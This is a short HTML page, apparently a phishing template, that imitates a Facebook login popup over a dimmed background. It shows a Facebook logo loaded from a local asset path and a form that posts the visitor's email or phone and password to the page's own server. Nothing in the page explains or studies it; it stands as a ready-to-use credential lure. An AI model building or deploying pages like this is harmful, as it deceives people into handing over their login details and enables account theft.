<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Facebook Log in</title>
  <style>
    body {
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .popup {
      width: 400px;
      background: #fff;
      padding: 20px;
      box-shadow: 0 0 20px #000;
      border-radius: 8px;
      text-align: center;
    }
    .popup img { width: 150px; }
    input, button { width: 100%; margin: 10px 0; padding: 10px; }
    button { background: #1877f2; color: #fff; border: none; font-weight: bold; }
  </style>
</head>
<body>
  <div class="popup">
    <img src="/assets/facebook.png" alt="Facebook">
    <form method="POST">
      <input type="text" name="email" placeholder="Email or Phone">
      <input type="password" name="password" placeholder="Password">
      <button type="submit">Log in</button>
    </form>
  </div>
</body>
</html>
